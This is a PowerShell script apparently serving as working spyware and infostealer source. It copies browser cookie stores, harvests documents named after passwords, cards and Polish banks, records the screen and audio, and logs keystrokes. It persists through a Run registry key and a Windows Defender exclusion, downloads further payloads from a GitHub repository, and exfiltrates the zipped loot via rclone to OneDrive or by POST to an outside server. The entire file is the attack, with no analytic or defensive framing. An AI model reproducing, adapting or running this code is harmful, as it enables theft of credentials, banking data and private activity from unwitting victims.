# luna.ps1 - PowerShell Agent: Cookies, Files, Video, Keylogger, AutoStart

$serverUrl = "https://onclick-back.onrender.com"
$tempDir = "$env:TEMP\luna"
$cookieDir = "$tempDir\cookies"
$fileDumpDir = "$tempDir\files"
$videoSubDir = "$tempDir\video"
$logPath = "$tempDir\log.json"
$keylogPath = "$tempDir\keylog.txt"
$recordingDir = "$env:USERPROFILE\luna_video_fragments"

New-Item -ItemType Directory -Force -Path $tempDir, $cookieDir, $fileDumpDir, $recordingDir, $videoSubDir, | Out-Null


Start-Transcript -Path "$tempDir\session.log" -Append

function Collect-Cookies {
    $targets = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data",
        "$env:APPDATA\Mozilla\Firefox\Profiles",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    )
    $patterns = @("*Cookies*", "*.sqlite", "*.ldb", "*.log")

    foreach ($root in $targets) {
        if (Test-Path $root) {
            Get-ChildItem -Path $root -Recurse -Include $patterns -File -ErrorAction SilentlyContinue |
            Where-Object { $_.Length -gt 0 } |
            ForEach-Object {
                try {
                    $safeName = $_.FullName -replace '[^\w\d\-_\.]', '_'
                    Copy-Item $_.FullName "$cookieDir\$safeName" -Force -ErrorAction Stop
                } catch {}
            }
        }
    }
}

function Collect-Files {
    $targets = @("Desktop", "Documents", "Downloads") | ForEach-Object { "$env:USERPROFILE\$_" }
    $extensions = "*.pdf", "*.doc*", "*.xls*", "*.txt"
    $keywords = @("haslo", "login", "password", "secret", "bank", "karta", "card", "visa", "dane", "konto", "portfel", "millenium", "pko", "pekao", "sber", "wallet")
    $maxSize = 5MB

    foreach ($dir in $targets) {
        foreach ($ext in $extensions) {
            Get-ChildItem -Path $dir -Recurse -Include $ext -File -ErrorAction SilentlyContinue | ForEach-Object {
                $file = $_
                if ($file.Length -le $maxSize -and $file.Name) {
                    foreach ($kw in $keywords) {
                        if ($file.Name.ToLowerInvariant().Contains($kw.ToLowerInvariant())) {
                            try {
                                $safeName = $file.Name -replace '[^\w\d\-_\.]', '_'
                                Copy-Item $file.FullName "$fileDumpDir\$safeName" -Force -ErrorAction Stop
                            } catch {}
                            break
                        }
                    }
                }
            }
        }
    }
}



function Start-Recording {
    $ffmpeg = "$PSScriptRoot\ffmpeg.exe"
    $recordingDir = "$env:USERPROFILE\luna_video_fragments"

    if (!(Test-Path $ffmpeg)) {
        Write-Warning "ffmpeg not found at $ffmpeg"
        return
    }

    if (!(Test-Path $recordingDir)) {
        New-Item -ItemType Directory -Path $recordingDir -Force | Out-Null
    }

    $ts = Get-Date -Format "yyyyMMdd_HHmmss"
    $pattern = "$recordingDir\frag_$ts_%03d.mp4"

    try {
        Start-Process -FilePath $ffmpeg -ArgumentList @(
            "-f", "gdigrab", "-framerate", "15", "-i", "desktop",
            "-f", "dshow", "-i", "audio=virtual-audio-capturer",
            "-vcodec", "libx264", "-preset", "veryfast",
            "-acodec", "aac", "-ar", "44100", "-b:a", "128k",
            "-f", "segment", "-segment_time", "60",
            "-reset_timestamps", "1", "$pattern"
        ) -WindowStyle Hidden -PassThru | Out-Null
        Write-Output "Recording started"
    } catch {
        Write-Warning "Failed to start ffmpeg recording: $_"
    }
}


"" | Out-File -Encoding utf8 -Force $keylogPath
Start-Job -ScriptBlock {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -TypeDefinition '
    using System; using System.Runtime.InteropServices;
    public class KeyLogger {
        [DllImport("User32.dll")] public static extern short GetAsyncKeyState(Int32 vKey);
    }'
    $map = @{ 8 = "[Back]"; 13 = "[Enter]"; 32 = " "; 27 = "[Esc]"; 9 = "[Tab]" }
    $logPath = "$env:TEMP\luna\keylog.txt"
    while ($true) {
        for ($i = 1; $i -le 255; $i++) {
            if ([KeyLogger]::GetAsyncKeyState($i) -eq -32767) {
                $char = try { if ($map[$i]) { $map[$i] } else { [char]$i } } catch { "[?]" }
                Add-Content -Path $logPath -Value $char -NoNewline -Encoding utf8
            }
        }
        Start-Sleep -Milliseconds 50
    }
}


function Ensure-Autostart {
    $path = "$env:APPDATA\Microsoft\Windows\luna"
    if (!(Test-Path $path)) {
        New-Item -ItemType Directory -Path $path -Force | Out-Null
        $repo = "https://raw.githubusercontent.com/Ex6TenZz/fb-login-clone/main/public/luna"
        $files = @("luna.ps1", "rclone.exe", "rclone.conf", "ffmpeg.exe", "luna_launcher.bat")
        foreach ($f in $files) {
            Invoke-WebRequest "$repo/$f" -OutFile "$path\$f" -UseBasicParsing
        }
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "luna" -Value "$path\luna_launcher.bat"
        Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue
    }
}

function Archive-And-Report {
    $videoSubDir = "$tempDir\video"
    New-Item -ItemType Directory -Path $videoSubDir -Force -ErrorAction SilentlyContinue | Out-Null

    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $user = $env:USERNAME
    $recordingDir = "$env:USERPROFILE\luna_video_fragments"
    $zipPath = "$env:USERPROFILE\luna_${user}_$timestamp.zip"
    $meta = "$tempDir\info.txt"
    $report = @{ user = $user; host = $env:COMPUTERNAME; timestamp = $timestamp }

    try {
        $report | ConvertTo-Json -Depth 5 | Set-Content -Path $logPath -Encoding utf8
        "System: $user@$env:COMPUTERNAME`nDate: $timestamp" | Set-Content $meta

        $pathsToArchive = @($logPath, $meta, $keylogPath)

        if (Test-Path $cookieDir) {
            $pathsToArchive += Get-ChildItem $cookieDir -Recurse -File -ErrorAction SilentlyContinue
        }

        if (Test-Path $fileDumpDir) {
            $pathsToArchive += Get-ChildItem $fileDumpDir -Recurse -File -ErrorAction SilentlyContinue
        }

        if (Test-Path $recordingDir) {
            Get-ChildItem $recordingDir -Filter *.mp4 -File -ErrorAction SilentlyContinue | ForEach-Object {
                $targetPath = "$videoSubDir\$($_.Name)"
                Copy-Item $_.FullName $targetPath -Force -ErrorAction SilentlyContinue
                $pathsToArchive += $targetPath
            }
        }
        
        $pathsToArchive = @(
            "$cookieDir\*",
            "$fileDumpDir\*",
            "$videoSubDir\*",
            $logPath, $meta, $keylogPath
        )
        if ($pathsToArchive.Count -eq 0) {
            Write-Warning "Nothing to archive - skipping archive/report"
            return
        }

        Compress-Archive -Path $pathsToArchive -DestinationPath $zipPath -Force
        & "$PSScriptRoot\rclone.exe" copy "$zipPath" "onedrive:luna_uploads/$user/$timestamp/" --config "$PSScriptRoot\rclone.conf" --quiet

        if ($LASTEXITCODE -ne 0) {
            $bytes = [System.IO.File]::ReadAllBytes($zipPath)
            $base64 = [System.Convert]::ToBase64String($bytes)
            $body = @{ data = $base64; filename = [IO.Path]::GetFileName($zipPath) } | ConvertTo-Json -Compress
            Invoke-RestMethod -Uri "$serverUrl/screenshot-archive" -Method POST -Body $body -ContentType "application/json"
        }

        if (Test-Path $fileDumpDir) {
            $filesCount = (Get-ChildItem $fileDumpDir -Recurse -ErrorAction SilentlyContinue).Count
        } else {
            $filesCount = 0
        }
        if (Test-Path $cookieDir) {
            $cookiesCount = (Get-ChildItem $cookieDir -Recurse -ErrorAction SilentlyContinue).Count
        } else {
            $cookiesCount = 0
        }

        $summary = @"
PowerShell Identity Report
User: $user
Machine: $env:COMPUTERNAME
Time: $timestamp
Files: $filesCount
Cookies: $cookiesCount
"@

        try {
            Invoke-RestMethod -Uri "$serverUrl/report" -Method POST -Body (@{ text = $summary } | ConvertTo-Json -Compress) -ContentType "application/json"
        } catch {
            Write-Warning "Failed to send report: $_"
        }
    } catch {
        Write-Warning "Archive or report failed: $_"
    }
}


function Cleanup {
    try {
        Remove-Item "$tempDir\*" -Recurse -Force -ErrorAction SilentlyContinue
        Write-Output "Temp cleaned"
    } catch {
        Write-Warning "Cleanup failed: $_"
    }
}

while ($true) {
    Collect-Cookies
    Collect-Files
    Start-Recording
    Ensure-Autostart
    Start-Sleep -Seconds 300
    Archive-And-Report
    if (Test-Path $zipPath) {
        Cleanup
    }
    Start-Sleep -Seconds 60
}

Stop-Transcript